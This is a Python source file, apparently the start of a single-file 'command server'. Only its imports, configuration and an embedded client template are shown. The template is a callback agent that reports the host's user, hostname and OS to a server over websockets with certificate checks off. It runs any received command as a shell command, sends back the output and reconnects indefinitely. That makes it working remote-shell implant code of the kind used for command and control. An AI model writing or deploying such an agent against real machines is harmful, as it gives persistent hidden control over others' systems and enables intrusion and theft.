#!/usr/bin/env python3
"""
Command Server — single-file remote command execution + web dashboard.
Requires: pip install aiohttp
Run:      python3 server.py
"""

import asyncio
import hashlib
import json
import secrets
import os
import sys
import getpass
import time
from pathlib import Path

try:
    from aiohttp import web, WSMsgType
except ImportError:
    sys.exit("Missing dependency. Run: pip install aiohttp")

# ─── CONFIG ───────────────────────────────────────────────────────────────────
HOST = "0.0.0.0"
PORT = 8443
BASE = Path(__file__).resolve().parent
DATA_DIR = BASE / "data"
DATA_DIR.mkdir(exist_ok=True)
CLIENTS_FILE = DATA_DIR / "clients.json"

# ─── CLIENT TEMPLATE ──────────────────────────────────────────────────────────
CLIENT_TEMPLATE = r'''
import asyncio, json, os, platform, socket, subprocess, sys, urllib.request, websockets

CLIENT_ID = "__CLIENT_ID__"
CLIENT_TOKEN = "__CLIENT_TOKEN__"
SERVER = "__SERVER__"

async def main():
    while True:
        try:
            async with websockets.connect(f"wss://{SERVER}", ssl=False) as ws:
                await ws.send(json.dumps({{"type": "register", "id": CLIENT_ID, "token": CLIENT_TOKEN,
                    "info": {{"os": platform.system(), "user": os.environ.get("USER","?"),
                              "host": socket.gethostname(), "arch": platform.machine()}}}}))
                async for msg in ws:
                    d = json.loads(msg)
                    if d["type"] == "cmd":
                        p = await asyncio.get_event_loop().run_in_executor(
                            None, lambda c=d["cmd"]: subprocess.run(c, shell=True, capture_output=True, text=True, cwd=os.path.expanduser("~")))
                        await ws.send(json.dumps({{"type": "output", "id": CLIENT_ID, "cmd": d["cmd"],
                            "stdout": p.stdout, "stderr": p.stderr, "rc": p.returncode}}))
                    elif d["type"] == "ping":
                        await ws.send(json.dumps({{"type": "pong", "id": CLIENT_ID}}))
        except Exception:
            await asyncio.sleep(5)

asyncio.run(main())
'''

